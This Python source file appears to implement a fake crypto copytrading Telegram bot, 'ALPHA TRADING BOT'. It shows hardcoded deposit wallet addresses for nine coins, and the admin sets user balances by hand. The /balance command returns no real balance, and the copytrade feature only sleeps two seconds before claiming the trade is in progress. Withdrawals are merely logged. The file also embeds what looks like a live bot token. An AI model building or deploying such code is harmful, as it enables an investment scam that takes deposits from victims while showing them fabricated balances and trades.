import os
import asyncio
import logging
import json
import uuid
from datetime import datetime
from typing import Dict, Any

import firebase_admin
from firebase_admin import credentials, firestore
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.utils import executor
from aiogram.types import ParseMode, ReplyKeyboardMarkup, KeyboardButton

# ---------------- Configurable Constants (from provided details) ----------------
BOT_TOKEN = "8927806117:AAH9VEjGg15j99QjJjTV53APrQOvs39_WK4"
BOT_USERNAME = "@AlphaTradingBot"
BOT_ID = 8927806117
BOT_NAME = "ALPHA TRADING BOT"
BOT_FULL_NAME = "ALPHA TRADING BOT"
BOT_VERSION = "3.0.0"
BOT_DESCRIPTION = "Advanced Trading Bot on Solana Blockchain"

ADMIN_ID = 2002829500
ADMIN_USERNAME = "@AlphaTrading"
ADMIN_NAME = "Alpha Trading"
ADMIN_USER_ID = 2002829500

SERVICE_ACCOUNT_FILE = "alphabot-6ed38-firebase-adminsdk-fbsvc-2570482f82.json"

SOLANA_ADDRESS = "BGFn4oh5gBbNiGTVGCBGde2enP8sVhdZjGqpM8sm91FT"
USDT_ADDRESS = "0x76e37261282a38dd2a785cc31561cac52bf6fba3"
USDT_TRC20_ADDRESS = "TWYDFyC1A6yVZ2wN3TMprp5nAvB3oga1rE"
USDC_SOLANA_ADDRESS = "BGFn4oh5gBbNiGTVGCBGde2enP8sVhdZjGqpM8sm91FT"
USDC_BASE_ADDRESS = "0x76e37261282a38dd2a785cc31561cac52bf6fba3"
ETH_ADDRESS = "0x76e37261282a38dd2a785cc31561cac52bf6fba3"
XRP_ADDRESS = "rn2WzAyKNs1tYkcN9PSRSziHF9RF1Tm5RR"
BNB_ADDRESS = "0x76e37261282a38dd2a785cc31561cac52bf6fba3"
BTC_ADDRESS = "bc1qrpnfgvdjj7hcms8fjnd7nzksarjduqsd6kfs2s"

LANGUAGE = "en"
# -------------------------------------------------------------------------------

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# States for multi-step conversations
class DepositStates(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class WithdrawStates(StatesGroup):
    waiting_for_amount = State()
    waiting_for_address = State()

class AdminDepositStates(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_amount = State()
    waiting_for_deposit_id = State()

class AdminWithdrawStates(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_amount = State()
    waiting_for_withdraw_id = State()

class BalanceUpdateStates(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_amount = State()

class CopyTradeStates(StatesGroup):
    waiting_for_address = State()

class ChatStates(StatesGroup):
    waiting_for_user_id = State()
    waiting_for_message = State()

def validate_environment():
    """Validate required files and constants"""
    if not BOT_TOKEN:
        raise ValueError("BOT_TOKEN is not set")
    env_json = os.environ.get("FIREBASE_SERVICE_ACCOUNT")
    if not env_json and not os.path.exists(SERVICE_ACCOUNT_FILE):
        raise FileNotFoundError(
            f"Set FIREBASE_SERVICE_ACCOUNT env var or place {SERVICE_ACCOUNT_FILE}"
        )

def initialize_firebase():
    """Initialize Firebase with proper error handling"""
    try:
        if not firebase_admin._apps:
            env_json = os.environ.get("FIREBASE_SERVICE_ACCOUNT")
            if env_json:
                cred = credentials.Certificate(json.loads(env_json))
            elif os.path.exists(SERVICE_ACCOUNT_FILE):
                cred = credentials.Certificate(SERVICE_ACCOUNT_FILE)
            else:
                raise FileNotFoundError("No Firebase credentials found")

            firebase_admin.initialize_app(cred)
            logger.info("Firebase initialized successfully")

        return firestore.client()
    except Exception as e:
        logger.error(f"Failed to initialize Firebase: {e}")
        raise

# Validate environment and initialize services
try:
    validate_environment()
    db = initialize_firebase()
except Exception as e:
    logger.critical(f"Initialization failed: {e}")
    exit(1)

# Bot setup with integrated BOT_TOKEN (no env var needed)
try:
    bot = Bot(token=BOT_TOKEN)
    storage = MemoryStorage()
    dp = Dispatcher(bot, storage=storage)
    logger.info("Bot initialized successfully")
except Exception as e:
    logger.critical(f"Failed to initialize bot: {e}")
    exit(1)

# Button labels for reply keyboard
BUTTON_TEXTS = ["💰 Wallet", "🏦 Balance", "📥 Deposit", "📤 Withdraw", "🔄 Copytrade", "💬 Chat"]

# Helper functions
def is_command(text: str) -> bool:
    """Check if the message is a command or button press"""
    if text in BUTTON_TEXTS:
        return True
    return text.startswith('/') and text.strip() in [
        '/start', '/wallet', '/balance', '/withdraw', '/copytrade', 
        '/balances', '/deposits', '/withdrawals', '/chat', '/cancel'
    ]

async def handle_command_in_state(message: types.Message, state: FSMContext):
    """Handle when user sends a command while in a state"""
    await state.finish()
    await message.reply("⚠️ **Previous operation cancelled.** Starting new command...")
    
    text = message.text.strip()
    if text == "💰 Wallet":
        await wallet_command(message)
    elif text == "🏦 Balance":
        await balance_command(message)
    elif text == "📥 Deposit":
        await start_command(message, state)
    elif text == "📤 Withdraw":
        await withdraw_command(message, state)
    elif text == "🔄 Copytrade":
        await copytrade_command(message)
    elif text == "💬 Chat":
        await chat_command(message, state)
    else:
        command = text.lower()
        if command == '/start':
            await start_command(message, state)
        elif command == '/wallet':
            await wallet_command(message)
        elif command == '/balance':
            await balance_command(message)
        elif command == '/withdraw':
            await withdraw_command(message, state)
        elif command == '/copytrade':
            await copytrade_command(message)
        elif command == '/balances':
            await balances_command(message, state)
        elif command == '/deposits':
            await deposits_command(message, state)
        elif command == '/withdrawals':
            await withdrawals_command(message, state)
        elif command == '/chat':
            await chat_command(message, state)
        elif command == '/cancel':
            await cancel_command(message, state)
        else:
            await message.reply("❌ Unknown command. Use /start to see available commands.")

async def create_user_account(user_id: int, username: str = None):
    """Create user account in Firebase"""
    try:
        user_ref = db.collection('accounts').document(str(user_id))
        user_data = {
            'telegram_user_id': user_id,
            'username': username or 'Unknown',
            'balance': 0.0,
            'created_at': datetime.now(),
            'updated_at': datetime.now()
        }
        user_ref.set(user_data, merge=True)
        logger.info(f"User account created/updated for ID: {user_id}")
        return True
    except Exception as e:
        logger.error(f"Error creating user account: {e}")
        return False

async def get_user_balance(user_id: int) -> float:
    """Get user balance from Firebase"""
    try:
        user_ref = db.collection('accounts').document(str(user_id))
        user_doc = user_ref.get()
        if user_doc.exists:
            return user_doc.to_dict().get('balance', 0.0)
        return 0.0
    except Exception as e:
        logger.error(f"Error getting user balance: {e}")
        return 0.0

async def update_user_balance(user_id: int, new_balance: float):
    """Update user balance in Firebase"""
    try:
        user_ref = db.collection('accounts').document(str(user_id))
        user_ref.update({
            'balance': new_balance,
            'updated_at': datetime.now()
        })
        return True
    except Exception as e:
        logger.error(f"Error updating user balance: {e}")
        return False

async def notify_admin_and_user(command: str, user_id: int, username: str, details: Dict[str, Any]):
    """Send notifications to both admin and user"""
    try:
        # Admin notification (more detailed)
        admin_message = f"🔔 **Admin Alert - Command Executed**\n\n"
        admin_message += f"👤 **User**: @{username} (ID: `{user_id}`)\n"
        admin_message += f"⚡ **Command**: `{command}`\n\n"
        admin_message += f"📊 **Full Details**:\n"
        for key, value in details.items():
            admin_message += f"• {key.replace('_', ' ').title()}: `{value}`\n"
        admin_message += f"\n⏰ **Timestamp**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        await bot.send_message(ADMIN_ID, admin_message, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        logger.error(f"Error sending notifications: {e}")

def is_admin(user_id: int) -> bool:
    """Check if user is admin"""
    return user_id == ADMIN_ID

def get_main_menu(user_id: int) -> ReplyKeyboardMarkup:
    """Return main menu keyboard; Chat button only visible to admin"""
    buttons = [
        [KeyboardButton("💰 Wallet"), KeyboardButton("🏦 Balance")],
        [KeyboardButton("📥 Deposit"), KeyboardButton("📤 Withdraw")],
        [KeyboardButton("🔄 Copytrade")],
    ]
    if user_id == ADMIN_ID:
        buttons.append([KeyboardButton("💬 Chat")])
    return ReplyKeyboardMarkup(buttons, resize_keyboard=True)

# Command handlers
@dp.message_handler(commands=['cancel'], state='*')
async def cancel_command(message: types.Message, state: FSMContext):
    """Handle /cancel command - cancels any ongoing operation"""
    current_state = await state.get_state()
    if current_state is None:
        await message.reply("❌ **No operation to cancel.**")
        return
    
    await state.finish()
    await message.reply("✅ **Operation cancelled successfully.** You can now use any command.")
    

@dp.message_handler(commands=['start'])
async def wallet_command(message: types.Message):
    """Handle /start command"""
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    
    wallet_message = f"""
🚀 **Welcome to {BOT_NAME}** 🚀

Hello @{username}! Welcome to our advanced copytrading platform.

💰 **Deposit Addresses:**
• **SOL (Solana)**: `{SOLANA_ADDRESS}`
• **USDT (BEP20)**: `{USDT_ADDRESS}`
• **USDT (TRC20)**: `{USDT_TRC20_ADDRESS}`
• **USDC (Solana)**: `{USDC_SOLANA_ADDRESS}`
• **USDC (Base)**: `{USDC_BASE_ADDRESS}`
• **ETH (Ethereum)**: `{ETH_ADDRESS}`
• **XRP**: `{XRP_ADDRESS}`
• **BNB (Smart Chain)**: `{BNB_ADDRESS}`
• **BTC**: `{BTC_ADDRESS}`

📝 **Available Commands:**
• /wallet - View wallet addresses
• /balance - Check your balance
• /withdraw - Withdraw funds
• /copytrade - Start copytrading
• /cancel - Cancel current operation
• /deposit - fund your wallet

"""
    
    keyboard = get_main_menu(user_id)
    await message.reply(wallet_message, parse_mode=ParseMode.MARKDOWN, reply_markup=keyboard)
    
    # Notify only admin
    admin_message = f"📋 **Start Command Used**\n\n👤 **User**: @{username} (ID: `{user_id}`)\n⏰ **Time**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    await bot.send_message(ADMIN_ID, admin_message, parse_mode=ParseMode.MARKDOWN)

@dp.message_handler(commands=['deposit'], state='*')
async def start_command(message: types.Message, state: FSMContext):
    """Handle /deposit command"""
    # Cancel any previous state
    await state.finish()
    
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    
    # Create user account
    await create_user_account(user_id, username)
    
    welcome_message = f"""
🚀 **{BOT_NAME}** 🚀

💰 **Your Deposit Addresses:**
• **SOL (Solana)**: `{SOLANA_ADDRESS}`
• **USDT (BEP20)**: `{USDT_ADDRESS}`
• **USDT (TRC20)**: `{USDT_TRC20_ADDRESS}`
• **USDC (Solana)**: `{USDC_SOLANA_ADDRESS}`
• **USDC (Base)**: `{USDC_BASE_ADDRESS}`
• **ETH (Ethereum)**: `{ETH_ADDRESS}`
• **XRP**: `{XRP_ADDRESS}`
• **BNB (Smart Chain)**: `{BNB_ADDRESS}`
• **BTC**: `{BTC_ADDRESS}`

📝 Please provide your deposit details:
"""
    
    await message.reply(welcome_message, parse_mode=ParseMode.MARKDOWN)
    await message.reply("💵 **Please enter the amount you want to deposit:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
    await DepositStates.waiting_for_amount.set()
    
    # Notify admin and user
    details = {
        'user_joined': f'@{username}',
        'user_id': user_id,
        'action': 'Started bot and initiated deposit process'
    }
    await notify_admin_and_user('/deposit', user_id, username, details)

@dp.message_handler(state=DepositStates.waiting_for_amount)
async def process_deposit_amount(message: types.Message, state: FSMContext):
    """Process deposit amount"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    
    try:
        amount = float(message.text)
        await state.update_data(amount=amount)
        await message.reply("🏦 **Please enter the address you deposited to:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
        await DepositStates.waiting_for_address.set()
    except ValueError:
        await message.reply("❌ Please enter a valid number for the amount.\n\n💡 *Tip: Use /cancel to cancel this operation*")

@dp.message_handler(state=DepositStates.waiting_for_address)
async def process_deposit_address(message: types.Message, state: FSMContext):
    """Process deposit address and store in Firebase"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    address = message.text
    
    data = await state.get_data()
    amount = data.get('amount')
    
    # Generate random deposit ID
    deposit_id = str(uuid.uuid4())
    
    # Store deposit in Firebase
    try:
        deposit_data = {
            'user_id': user_id,
            'username': username,
            'amount': amount,
            'address': address,
            'confirmed': False,
            'created_at': datetime.now(),
            'type': 'deposit'
        }
        
        db.collection('deposits').document(deposit_id).set(deposit_data)
        
        await message.reply(f"✅ **Deposit request submitted successfully!**\n\n📋 **Deposit ID**: `{deposit_id}`\n💰 **Amount**: `{amount}`\n🏦 **Address**: `{address}`\n\n⏳ **Status**: Pending confirmation")
        
        # Notify admin and user
        details = {
            'deposit_id': deposit_id,
            'amount': amount,
            'address': address,
            'status': 'Pending confirmation',
            'admin_only_info': f'Document stored in deposits/{deposit_id}'
        }
        await notify_admin_and_user('deposit_request', user_id, username, details)
        
        await state.finish()
        
    except Exception as e:
        logger.error(f"Error storing deposit: {e}")
        await message.reply("❌ Error processing deposit. Please try again.")
        await state.finish()

@dp.message_handler(commands=['wallet'])
async def wallet_command(message: types.Message):
    """Handle /wallet command"""
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    
    wallet_message = f"""
💼 **{BOT_NAME} Wallet Addresses**

🟡 **SOL (Solana):**
`{SOLANA_ADDRESS}`

🟢 **USDT (BEP20):**
`{USDT_ADDRESS}`

🟠 **USDT (TRC20):**
`{USDT_TRC20_ADDRESS}`

🔵 **USDC (Solana):**
`{USDC_SOLANA_ADDRESS}`

🔷 **USDC (Base):**
`{USDC_BASE_ADDRESS}`

⚫ **ETH (Ethereum):**
`{ETH_ADDRESS}`

⚪ **XRP:**
`{XRP_ADDRESS}`

🟡 **BNB (Smart Chain):**
`{BNB_ADDRESS}`

🟤 **BTC:**
`{BTC_ADDRESS}`

🔒 **Security Tips:**
• Always double-check addresses before sending
• Only send the specified cryptocurrency to the listed addresses
• Never share your private keys or seed phrases
"""
    
    await message.reply(wallet_message, parse_mode=ParseMode.MARKDOWN)
    
    # Notify only admin
    admin_message = f"📋 **Wallet Command Used**\n\n👤 **User**: @{username} (ID: `{user_id}`)\n⏰ **Time**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    await bot.send_message(ADMIN_ID, admin_message, parse_mode=ParseMode.MARKDOWN)

@dp.message_handler(commands=['balance'])
async def balance_command(message: types.Message):
    """Handle /balance command"""
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    
    await message.reply("⏳ **Fetching balance, please wait...**")
    
    # Notify admin about balance request
    admin_message = f"""
💰 **Balance Request**

👤 **User Details:**
• Username: @{username}
• User ID: `{user_id}`
• Full Name: {message.from_user.full_name}

⏰ **Request Time**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    await bot.send_message(ADMIN_ID, admin_message, parse_mode=ParseMode.MARKDOWN)
    
    await message.reply("📊 **Balance will be sent shortly...**")

@dp.message_handler(commands=['balances'], state='*')
async def balances_command(message: types.Message, state: FSMContext):
    """Handle /balances command (Admin only)"""
    # Cancel any previous state
    await state.finish()
    
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        await message.reply("❌ **Access Denied**: This command is only available to administrators.")
        return
    
    await message.reply("👤 **Please enter the Telegram User ID to update balance:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
    await BalanceUpdateStates.waiting_for_user_id.set()

@dp.message_handler(state=BalanceUpdateStates.waiting_for_user_id)
async def process_balance_user_id(message: types.Message, state: FSMContext):
    """Process user ID for balance update"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    
    try:
        target_user_id = int(message.text)
        await state.update_data(target_user_id=target_user_id)
        await message.reply("💰 **Please enter the amount to update:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
        await BalanceUpdateStates.waiting_for_amount.set()
    except ValueError:
        await message.reply("❌ Please enter a valid User ID (numbers only).\n\n💡 *Tip: Use /cancel to cancel this operation*")

@dp.message_handler(state=BalanceUpdateStates.waiting_for_amount)
async def process_balance_amount(message: types.Message, state: FSMContext):
    """Process balance update amount"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    try:
        amount = float(message.text)
        data = await state.get_data()
        target_user_id = data.get('target_user_id')
        
        # Update balance in Firebase
        success = await update_user_balance(target_user_id, amount)
        
        if success:
            await message.reply(f"✅ **Balance updated successfully!**\n\n👤 **User ID**: `{target_user_id}`\n💰 **New Balance**: `{amount}`")
            
            # Notify target user
            try:
                user_message = f"💰 **Balance Updated**\n\n✅ **Your new balance**: `{amount}`\n⏰ **Updated**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                await bot.send_message(target_user_id, user_message, parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                await message.reply(f"⚠️ Balance updated but couldn't notify user: {e}")
        else:
            await message.reply("❌ **Error updating balance**. Please try again.")
        
        await state.finish()
        
    except ValueError:
        await message.reply("❌ Please enter a valid amount (numbers only).")

@dp.message_handler(commands=['withdraw'], state='*')
async def withdraw_command(message: types.Message, state: FSMContext):
    """Handle /withdraw command"""
    # Cancel any previous state
    await state.finish()
    
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    
    await message.reply("🔄 **Withdraw X SOL**\n\n💰 **Please enter the amount to withdraw:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
    await WithdrawStates.waiting_for_amount.set()

@dp.message_handler(state=WithdrawStates.waiting_for_amount)
async def process_withdraw_amount(message: types.Message, state: FSMContext):
    """Process withdrawal amount"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    
    try:
        amount = float(message.text)
        await state.update_data(amount=amount)
        await message.reply("🏦 **Please enter the address to withdraw to:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
        await WithdrawStates.waiting_for_address.set()
    except ValueError:
        await message.reply("❌ Please enter a valid number for the amount.\n\n💡 *Tip: Use /cancel to cancel this operation*")

@dp.message_handler(state=WithdrawStates.waiting_for_address)
async def process_withdraw_address(message: types.Message, state: FSMContext):
    """Process withdrawal address"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    address = message.text
    
    data = await state.get_data()
    amount = data.get('amount')
    
    # Generate random withdrawal ID
    withdraw_id = str(uuid.uuid4())
    
    try:
        withdraw_data = {
            'user_id': user_id,
            'username': username,
            'amount': amount,
            'address': address,
            'confirmed': False,
            'created_at': datetime.now(),
            'type': 'withdrawal'
        }
        
        db.collection('withdrawals').document(withdraw_id).set(withdraw_data)
        
        await message.reply(f"✅ **Withdrawal request submitted!**\n\n📋 **Withdrawal ID**: `{withdraw_id}`\n💰 **Amount**: `{amount}`\n🏦 **Address**: `{address}`\n\n⏳ **Status**: Pending confirmation")
        
        # Notify admin and user
        details = {
            'withdraw_id': withdraw_id,
            'amount': amount,
            'address': address,
            'status': 'Pending confirmation',
            'admin_only_info': f'Document stored in withdrawals/{withdraw_id}'
        }
        await notify_admin_and_user('withdrawal_request', user_id, username, details)
        
        await state.finish()
        
    except Exception as e:
        logger.error(f"Error storing withdrawal: {e}")
        await message.reply("❌ Error processing withdrawal. Please try again.")
        await state.finish()

@dp.message_handler(commands=['withdrawals'], state='*')
async def withdrawals_command(message: types.Message, state: FSMContext):
    """Handle /withdrawals command (Admin only)"""
    # Cancel any previous state
    await state.finish()
    
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        await message.reply("❌ **Access Denied**: This command is only available to administrators.")
        return
    
    await message.reply("👤 **Please enter the Telegram User ID:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
    await AdminWithdrawStates.waiting_for_user_id.set()

@dp.message_handler(state=AdminWithdrawStates.waiting_for_user_id)
async def process_admin_withdraw_user_id(message: types.Message, state: FSMContext):
    """Process user ID for admin withdrawal confirmation"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    
    try:
        target_user_id = int(message.text)
        await state.update_data(target_user_id=target_user_id)
        await message.reply("💰 **Please enter the withdrawal amount:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
        await AdminWithdrawStates.waiting_for_amount.set()
    except ValueError:
        await message.reply("❌ Please enter a valid User ID.\n\n💡 *Tip: Use /cancel to cancel this operation*")

@dp.message_handler(state=AdminWithdrawStates.waiting_for_amount)
async def process_admin_withdraw_amount(message: types.Message, state: FSMContext):
    """Process withdrawal amount for admin confirmation"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    
    try:
        amount = float(message.text)
        await state.update_data(amount=amount)
        await message.reply("🆔 **Please enter the Withdrawal ID:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
        await AdminWithdrawStates.waiting_for_withdraw_id.set()
    except ValueError:
        await message.reply("❌ Please enter a valid amount.\n\n💡 *Tip: Use /cancel to cancel this operation*")

@dp.message_handler(state=AdminWithdrawStates.waiting_for_withdraw_id)
async def process_admin_withdraw_id(message: types.Message, state: FSMContext):
    """Process withdrawal ID and confirm withdrawal"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    withdraw_id = message.text.strip()
    data = await state.get_data()
    target_user_id = data.get('target_user_id')
    amount = data.get('amount')
    
    try:
        # Update withdrawal confirmation in Firebase
        withdraw_ref = db.collection('withdrawals').document(withdraw_id)
        withdraw_ref.update({
            'confirmed': True,
            'confirmed_at': datetime.now(),
            'confirmed_by': message.from_user.id
        })
        
        await message.reply(f"✅ **Withdrawal confirmed successfully!**\n\n🆔 **Withdrawal ID**: `{withdraw_id}`\n👤 **User ID**: `{target_user_id}`\n💰 **Amount**: `{amount}`")
        
        # Notify target user
        try:
            user_message = f"✅ **Withdrawal Confirmed**\n\n🆔 **Withdrawal ID**: `{withdraw_id}`\n💰 **Amount**: `{amount}`\n⏰ **Confirmed**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            await bot.send_message(target_user_id, user_message, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            await message.reply(f"⚠️ Withdrawal confirmed but couldn't notify user: {e}")
        
        await state.finish()
        
    except Exception as e:
        logger.error(f"Error confirming withdrawal: {e}")
        await message.reply("❌ Error confirming withdrawal. Please check the Withdrawal ID.")
        await state.finish()

@dp.message_handler(commands=['deposits'], state='*')
async def deposits_command(message: types.Message, state: FSMContext):
    """Handle /deposits command (Admin only)"""
    # Cancel any previous state
    await state.finish()
    
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        await message.reply("❌ **Access Denied**: This command is only available to administrators.")
        return
    
    await message.reply("👤 **Please enter the Telegram User ID:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
    await AdminDepositStates.waiting_for_user_id.set()

@dp.message_handler(state=AdminDepositStates.waiting_for_user_id)
async def process_admin_deposit_user_id(message: types.Message, state: FSMContext):
    """Process user ID for admin deposit confirmation"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    
    try:
        target_user_id = int(message.text)
        await state.update_data(target_user_id=target_user_id)
        await message.reply("💰 **Please enter the deposit amount:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
        await AdminDepositStates.waiting_for_amount.set()
    except ValueError:
        await message.reply("❌ Please enter a valid User ID.\n\n💡 *Tip: Use /cancel to cancel this operation*")

@dp.message_handler(state=AdminDepositStates.waiting_for_amount)
async def process_admin_deposit_amount(message: types.Message, state: FSMContext):
    """Process deposit amount for admin confirmation"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    
    try:
        amount = float(message.text)
        await state.update_data(amount=amount)
        await message.reply("🆔 **Please enter the Deposit ID:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
        await AdminDepositStates.waiting_for_deposit_id.set()
    except ValueError:
        await message.reply("❌ Please enter a valid amount.\n\n💡 *Tip: Use /cancel to cancel this operation*")

@dp.message_handler(state=AdminDepositStates.waiting_for_deposit_id)
async def process_admin_deposit_id(message: types.Message, state: FSMContext):
    """Process deposit ID and confirm deposit"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    deposit_id = message.text.strip()
    data = await state.get_data()
    target_user_id = data.get('target_user_id')
    amount = data.get('amount')
    
    try:
        # Update deposit confirmation
        deposit_ref = db.collection('deposits').document(deposit_id)
        deposit_ref.update({
            'confirmed': True,
            'confirmed_at': datetime.now(),
            'confirmed_by': message.from_user.id
        })
        
        # Add amount to user's balance
        current_balance = await get_user_balance(target_user_id)
        new_balance = current_balance + amount
        await update_user_balance(target_user_id, new_balance)
        
        await message.reply(f"✅ **Deposit confirmed and balance updated!**\n\n🆔 **Deposit ID**: `{deposit_id}`\n👤 **User ID**: `{target_user_id}`\n💰 **Amount**: `{amount}`\n📊 **New Balance**: `{new_balance}`")
        
        # Notify target user
        try:
            user_message = f"✅ **Deposit Confirmed**\n\n🆔 **Deposit ID**: `{deposit_id}`\n💰 **Amount**: `{amount}`\n📊 **New Balance**: `{new_balance}`\n⏰ **Confirmed**: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            await bot.send_message(target_user_id, user_message, parse_mode=ParseMode.MARKDOWN)
        except Exception as e:
            await message.reply(f"⚠️ Deposit confirmed but couldn't notify user: {e}")
        
        await state.finish()
        
    except Exception as e:
        logger.error(f"Error confirming deposit: {e}")
        await message.reply("❌ Error confirming deposit. Please check the Deposit ID.")
        await state.finish()

@dp.message_handler(commands=['chat'], state='*')
async def chat_command(message: types.Message, state: FSMContext):
    """Handle /chat command (Admin only)"""
    # Cancel any previous state
    await state.finish()
    
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        await message.reply("❌ **Access Denied**: This command is only available to administrators.")
        return
    
    await message.reply("👤 **Please enter the Telegram User ID to send message to:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
    await ChatStates.waiting_for_user_id.set()

@dp.message_handler(state=ChatStates.waiting_for_user_id)
async def process_chat_user_id(message: types.Message, state: FSMContext):
    """Process user ID for chat message"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    
    try:
        target_user_id = int(message.text)
        await state.update_data(target_user_id=target_user_id)
        await message.reply("💬 **Please enter the message to send:**\n\n💡 *Tip: Use /cancel to cancel this operation*")
        await ChatStates.waiting_for_message.set()
    except ValueError:
        await message.reply("❌ Please enter a valid User ID (numbers only).\n\n💡 *Tip: Use /cancel to cancel this operation*")

@dp.message_handler(state=ChatStates.waiting_for_message)
async def process_chat_message(message: types.Message, state: FSMContext):
    """Process and send the chat message"""
    # Check if user sent a command instead
    if is_command(message.text):
        await handle_command_in_state(message, state)
        return
    admin_id = message.from_user.id
    admin_username = message.from_user.username or 'Admin'
    chat_message = message.text
    
    data = await state.get_data()
    target_user_id = data.get('target_user_id')
    
    try:
        # Send personalized message to target user
        user_message = f"""

{chat_message}
---
"""
        
        await bot.send_message(target_user_id, user_message, parse_mode=ParseMode.MARKDOWN)
        
        # Confirm to admin
        await message.reply(f"✅ **Message sent successfully!**\n\n👤 **To User ID**: `{target_user_id}`\n💬 **Message**: {chat_message[:100]}{'...' if len(chat_message) > 100 else ''}")
        
        # Log the activity
        logger.info(f"Admin {admin_id} sent message to user {target_user_id}")
        
        await state.finish()
        
    except Exception as e:
        logger.error(f"Error sending chat message: {e}")
        await message.reply(f"❌ **Error sending message**: {str(e)}\n\nPlease check if the User ID is valid and the user has started the bot.")
        await state.finish()

@dp.message_handler(commands=['copytrade'], state='*')
async def copytrade_command(message: types.Message):
    """Handle /copytrade command"""
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    
    await message.reply("🔄 **Enter the address to copytrade:**")
    await CopyTradeStates.waiting_for_address.set()

@dp.message_handler(state=CopyTradeStates.waiting_for_address)
async def process_copytrade_address(message: types.Message, state: FSMContext):
    """Process copytrade address"""
    user_id = message.from_user.id
    username = message.from_user.username or 'Unknown'
    address = message.text
    
    await message.reply("⏳ **Processing copytrading request...**")
    await asyncio.sleep(2)  # Wait 2 seconds as requested
    
    await message.reply(f"🚀 **Copytrading address `{address}` in progress!**")
    
    # Alert both admin and user
    details = {
        'copytrade_address': address,
        'status': 'In Progress',
        'initiated_by': f'@{username}',
        'user_id': user_id
    }
    await notify_admin_and_user('copytrade', user_id, username, details)
    
    await state.finish()

# Error handler
@dp.errors_handler()
async def errors_handler(update, exception):
    """Handle errors"""
    logger.error(f"Update {update} caused error {exception}")
    return True

async def create_app():
    """Create aiohttp web application for health checks"""
    from aiohttp import web
    
    async def health_check(request):
        return web.Response(text=f"{BOT_NAME} is running successfully!", status=200)
    
    async def root_handler(request):
        return web.Response(text=f"{BOT_NAME} - Online", status=200)
    
    app = web.Application()
    app.router.add_get('/', root_handler)
    app.router.add_get('/health', health_check)
    app.router.add_get('/status', health_check)
    
    return app

async def init_bot_and_server():
    """Initialize both bot and web server concurrently"""
    from aiohttp import web
    
    # Create web app
    app = await create_app()
    
    # Get port from environment (Render sets this automatically)
    port = int(os.environ.get('PORT', 8080))
    
    # Start web server
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    
    logger.info(f"Web server started on port {port}")
    logger.info(f"Starting {BOT_NAME}...")
    
    # Start bot polling
    try:
        await dp.start_polling()
    finally:
        await runner.cleanup()

if __name__ == '__main__':
    # Run both bot and web server
    try:
        asyncio.run(init_bot_and_server())
    except KeyboardInterrupt:
        logger.info("Bot stopped by user")
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        exit(1)